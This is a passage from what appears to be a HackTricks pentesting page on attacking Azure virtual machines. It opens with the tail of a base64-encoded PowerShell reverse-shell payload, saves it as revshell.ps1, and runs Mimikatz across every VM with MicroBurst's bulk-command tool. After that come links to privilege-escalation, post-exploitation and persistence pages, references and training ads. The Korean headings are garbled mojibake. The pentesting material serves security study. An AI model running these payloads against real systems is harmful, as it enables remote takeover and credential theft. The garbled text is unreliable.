C4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

# The content of
echo "powershell.exe -EncodedCommand $encodedCommand" > revshell.ps1


# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
{% endcode %}
{% endtab %}
{% endtabs %}

## ê¶Œí•œ ìƒìŠ¹

{% content-ref url="../../az-privilege-escalation/az-virtual-machines-and-network-privesc.md" %}
[az-virtual-machines-and-network-privesc.md](../../az-privilege-escalation/az-virtual-machines-and-network-privesc.md)
{% endcontent-ref %}

## ì¸ì¦ë˜ì§€ ì•Šì€ ì ‘ê·¼

{% content-ref url="../../az-unauthenticated-enum-and-initial-entry/az-vms-unath.md" %}
[az-vms-unath.md](../../az-unauthenticated-enum-and-initial-entry/az-vms-unath.md)
{% endcontent-ref %}

## í¬ìŠ¤íŠ¸ ìµìŠ¤í”Œë¡œì‡

{% content-ref url="../../az-post-exploitation/az-vms-and-network-post-exploitation.md" %}
[az-vms-and-network-post-exploitation.md](../../az-post-exploitation/az-vms-and-network-post-exploitation.md)
{% endcontent-ref %}

## ì§€ì†ì„±

{% content-ref url="../../az-persistence/az-vms-persistence.md" %}
[az-vms-persistence.md](../../az-persistence/az-vms-persistence.md)
{% endcontent-ref %}

## ì°¸ê³ ìë£Œ

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)
* [https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
